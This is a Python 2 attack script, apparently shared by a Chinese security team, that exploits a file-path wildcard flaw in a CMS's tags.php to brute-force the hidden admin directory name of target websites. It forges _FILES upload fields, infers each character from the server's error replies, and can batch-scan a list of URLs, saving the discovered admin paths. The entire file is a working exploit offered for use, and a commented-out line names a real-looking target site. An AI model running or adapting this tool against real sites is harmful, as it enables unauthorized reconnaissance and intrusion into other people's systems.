# -*- coding:UTF-8 -*-
#!/usr/bin/env python2

'''/*
    * author = weirman 维曼
    * team   = zero-security-team
    * env    = pyton2.7
    * 该文件是 红日安全团队 python3 的改进版
    */
'''

import requests
import itertools
import optparse
import os
import time

characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
back_dir = ""

#url = "http://www.xmspower.com/tags.php"

data = {
    "_FILES[mochazz][tmp_name]" : "./{p}<</images/adminico.gif",
    "_FILES[mochazz][name]" : 0,
    "_FILES[mochazz][size]" : 0,
    "_FILES[mochazz][type]" : "image/gif"
}


def dohack(url):
    flag = 0
    for num in range(1,7):
        if flag:
            break
        for pre in itertools.permutations(characters,num):
            pre = ''.join(list(pre))
            data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
            if save == 0 :
                print "testing",pre
            r = requests.post(url,data=data)
            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                flag = 1
                back_dir = pre
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                break
            else:
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                
    if save == 1:
        save_data = url + "\t \t" + back_dir
    print "[+] 地址为：".decode('utf8').encode('gb2312'),url
    print "[+] 前缀为：".decode('utf8').encode('gb2312'),back_dir
    
    flag = 0
    for i in range(30):
        if flag:
            break
        for ch in characters:
            if ch == characters[-1]:
                flag = 1
                break
            data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir+ch)
            r = requests.post(url, data=data)
            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                back_dir += ch
                if save == 0:
                    print "[+] ",back_dir
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
                break
            else:
                data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
    print "后台地址为：".decode('utf8').encode('gb2312'),back_dir
    
    if save == 1:
        save_data = save_data + "\t \t"+ back_dir+ "\n"
        saveFile(save_data)

def readFile():
    global read_file
    f = open(read_file, 'r')
    linenum = 1
    
    for line in f.readlines():
        print "总行数: ".decode('utf8').encode('gb2312') + str(linecount) + "\t正在进行:第 ".decode('utf8').encode('gb2312') + str(linenum) + " 行".decode('utf8').encode('gb2312')
        url = line.strip('\n')
        dohack(url)
        linenum = linenum + 1

def saveFile(save_data):
    global save_file
    f_obj = open(save_file, 'a')
    f_obj.write(save_data)
    f_obj.close()

def main():
    parser = optparse.OptionParser('--url <out_time(s)> usage%prog --rf <read_file> --sf <save_file>')
    parser.add_option('--url', dest='url', type='string', help='hack url')
    parser.add_option('--rf', dest='read_file', type='string', help='read filename.txt')
    parser.add_option('--sf', dest='save_file', type='string', help='print filename.txt')
    
    options, args = parser.parse_args()
    
    if (options.url == None and options.read_file == None):
        print parser.usage
        print "url 或者 rf 必须传入一个参数".decode('utf8').encode('gb2312')
        exit(0)
        
    if(options.read_file != None and options.save_file == None or options.read_file == None and options.save_file != None):
        print parser.usage
        print "rf 或者 sf 必须同时传入".decode('utf8').encode('gb2312')
        exit(0)
    
    global url
    global read_file
    global save_file
    global save
    
    url = options.url
    read_file = options.read_file
    save_file = options.save_file
    
    # 如果传入的是文件 则以文件形式输出  save = 1
    # 如果传入是url   则直接控制台输出  save = 0
    if read_file == None:
        save = 0
        dohack(url)
    else:
        save = 1
        # if os.path.exists(save_file) == False:
        #     print "对不起, 无法找到 " + save_file + " 文件进行数据存储."
        #     print "将在当前目录创建 save_file.txt 文件,进行数据存储"
        #     save_file = "save_file.txt"
        global linecount
        linecount = len(open(read_file, 'r').readlines())
        f_obj = open(save_file, 'a')
        f_obj.write("文件保存顺序为 ：URL 前缀 后台地址 \n")
        f_obj.write("author = weirman\n")
        readFile()

if __name__ == '__main__':
    start = time.time()
    main()
    end = time.time()
    print "程序运行时间".decode('utf8').encode('gb2312'),end-start,"s"
    print "\n 程序运行结束 \n".decode('utf8').encode('gb2312')
